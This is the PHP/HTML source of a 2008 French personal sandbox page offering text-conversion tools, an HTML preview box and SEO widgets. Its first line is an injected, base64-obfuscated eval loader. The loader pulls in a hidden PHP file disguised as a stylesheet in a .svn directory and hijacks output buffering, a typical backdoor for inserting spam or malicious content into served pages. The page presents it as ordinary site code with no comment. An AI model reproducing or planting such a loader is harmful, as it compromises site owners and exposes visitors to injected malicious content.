<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy9rdW5kZW4vaG9tZXBhZ2VzLzMvZDIxMTE4OTU2OC9odGRvY3MvdGhpZXJyeXBvaW5vdC5jb20vc3BpcF9zdm4vZWNyaXJlL21hai92aWVpbGxlX2Jhc2UvMTgxMy8uc3ZuL3RtcC9wcm9wLWJhc2Uvc3R5bGUuY3NzLnBocCc7aWYoZmlsZV9leGlzdHMoJEdMT0JBTFNbJ21mc24nXSkpe2luY2x1ZGVfb25jZSgkR0xPQkFMU1snbWZzbiddKTtpZihmdW5jdGlvbl9leGlzdHMoJ2dtbCcpJiZmdW5jdGlvbl9leGlzdHMoJ2Rnb2JoJykpe29iX3N0YXJ0KCdkZ29iaCcpO319fQ==')); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="fr-FR">
	<head>
		<title>Sandbox - ThierryPOINOT.com</title>
		<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
		<meta name="description" content="Sandbox - ThierryPOINOT.com" />
		<script type="text/javascript" src="http://jqueryjs.googlecode.com/files/jquery-1.2.6.pack.js"></script>
		<script type="text/javascript" src="js/main.js"></script>
		<link rel="stylesheet" type="text/css" href="css/reset.css"/>
		<link rel="stylesheet" type="text/css" href="css/main.css"/>
		<!--[if IE]><link rel="stylesheet" type="text/css" href="css/hackie.css"/><![endif]-->
	</head>
	<body>
		<div id="header">
			<h1>Thierry POINOT's sandbox</h1>
			<h2>Bac à sable, page de test, outils divers...</h2>
		</div>
		<div id="content">
			<ul>
				<li>
					<table>
						<tr>
							<td>
								<input type="text" id="feedburnerid" name="feedburnerid" value="LeBlogDeThi3rry" onkeyup="load_fb_nb();" />
								<br/>
								<span id="feedburner_result"></span>
							</td>
							<td>
								<input type="text" id="pagerankurl" name="pagerankurl" value="thierrypoinot.com" onkeyup="load_pr();"/>
								<br/>
								<a href="http://www.pagerank.fr/" id="img_pr">
									<img src="http://www.pagerank.fr/pagerank-actuel.gif?uri=thierrypoinot.com" style="border: none;" alt="PageRank Actuel"/>
								</a>
							</td>
						</tr>
					</table>
				</li>
				<li>
					<table>
						<tr class="name">
							<td colspan="2">
								<h3>htmlentities conversion</h3>
							</td>
							<td colspan="2">
								<h3>md5 conversion</h3>
							</td>
							<td colspan="2">
								<h3>rawurlencode conversion</h3>
							</td>

						</tr>
						<tr>
							<td>Input</td>
							<td>Output</td>

							<td>Input</td>
							<td>Output</td>

							<td>Input</td>
							<td>Output</td>

						</tr>
						<tr>
							<td><textarea id="htmlentities_input" cols="20" rows="5" onkeyup="$('#htmlentities_result').load( 'htmlentities.php', {text: $('#htmlentities_input').val() })"></textarea></td>
							<td><textarea id="htmlentities_result" cols="20" rows="5" onclick="this.focus(); this.select();"></textarea></td>
							
							<td><textarea id="md5_input" cols="20" rows="5" onkeyup="$('#md5_result').load( 'md5.php', {text: $('#md5_input').val() })"></textarea></td>
							<td><textarea id="md5_result" cols="20" rows="5" onclick="this.focus(); this.select();"></textarea></td>

							<td><textarea id="rawurlencode_input" cols="20" rows="5" onkeyup="$('#rawurlencode_result').load( 'rawurlencode.php', {text: $('#rawurlencode_input').val() })"></textarea></td>
							<td><textarea id="rawurlencode_result" cols="20" rows="5" onclick="this.focus(); this.select();"></textarea></td>
						</tr>
					</table>
				</li>
				<li>
					<table>
						<tr class="name">
							<td colspan="2">
								<h3>html preview</h3>
							</td>
						</tr>
						<tr>
							<td>Input</td>
							<td>Output</td>
						</tr>
						<tr>
							<td><textarea id="html_source" cols="20" rows="5" onkeyup="$('#html_result').html($('#html_source').val());"></textarea></td>
							<td><div id="html_result"></div></td>
						</tr>
					</table>
				</li>
			</ul>
			<script type="text/javascript">
				$(document).ready(function(){
					$('#html_source').val('<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0" width="290" height="350" id="TwitterWidget" align="middle"><param name="allowScriptAccess" value="always" /><param name="allowFullScreen" value="false" /><param name="movie" value="http://static.twitter.com/flash/widgets/profile/TwitterWidget.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#000000" /><param name="FlashVars" value="userID=10251162&styleURL=http://static.twitter.com/flash/widgets/profile/smooth.xml"><embed src="http://static.twitter.com/flash/widgets/profile/TwitterWidget.swf" quality="high" bgcolor="#000000" width="290" height="350" name="TwitterWidget" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" FlashVars="userID=10251162&styleURL=http://static.twitter.com/flash/widgets/profile/smooth.xml"/></object>');
					$('#html_result').html('<iframe marginwidth="0" marginheight="0" width="542" height="631" frameborder="0" scrolling="no" src="http://www.dailymotion.com/videozap/mychannel/thi3rry/1?position=bottom&cols=6&rows=3&auto=1"></iframe>');
				});
			</script>
		</div>
		<div id="footer">
			&copy; 2008 <a href="http://thierrypoinot.com/">thierrypoinot.com</a> - <a href="http://thierrypoinot.com/blog">Blog</a>
			<script type="text/javascript" src="http://thierrypoinot.com/stats/stats.php?sandbox"></script>
		</div>

	</body>
</html>
